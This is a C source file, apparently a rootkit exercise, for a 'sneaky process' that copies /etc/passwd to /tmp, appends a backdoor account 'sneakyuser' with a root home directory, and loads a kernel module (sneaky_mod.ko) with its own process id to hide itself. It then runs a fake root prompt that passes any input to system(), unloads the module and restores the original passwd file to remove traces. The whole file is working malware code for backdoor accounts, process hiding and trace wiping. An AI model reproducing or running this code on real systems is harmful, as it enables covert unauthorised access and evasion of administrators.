#include<stdlib.h>
#include<stdio.h>
#include<string.h>
#include <sys/types.h>
#include <unistd.h>
void cp_and_change(){
  system("cp /etc/passwd /tmp/");
  system("echo \"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\" >> /etc/passwd");
}
void print_id(){
  printf("sneaky_process pid = %d\n", getpid());
}
void load_module(pid_t process_id){
  char parameter[80];
  char path[1024];
  getcwd(path, sizeof(path));
  sprintf(parameter, "insmod ./sneaky_mod.ko process_id=%d process_path='\"%s\"'\n", process_id, path);
  //  printf("parameter is : %s\n", parameter);
  system(parameter);
}
void do_loop(){
  char* c;
  size_t len;
  char* benchmark = "q\n";
  char* benchmark2 = "exit\n";
  while(1){
    printf("root@vcm-3079: ");
    getline(&c, &len, stdin);
    /* printf("c is %s\n", c); */
    /* int test = strcmp(c, benchmark); */
    /* int test2 = strcmp(c, benchmark2); */
    /* printf("test1 is : %d, test2 is %d\n", test, test2); */
    if(strcmp(c, benchmark) == 0 || strcmp(c, benchmark2)==0){
      return;
    }
    system(c);
  }
}
void unload_module(){
  system("rmmod ./sneaky_mod.ko");
}
void wipe_out_trace(){
  system("rm /etc/passwd");
  system("cp /tmp/passwd /etc/");
  system("rm /tmp/passwd");
}
int main(){
  cp_and_change();
  print_id();
  load_module(getpid());
  do_loop();
  unload_module();
  //do_loop();
  wipe_out_trace();
  return EXIT_SUCCESS;
}
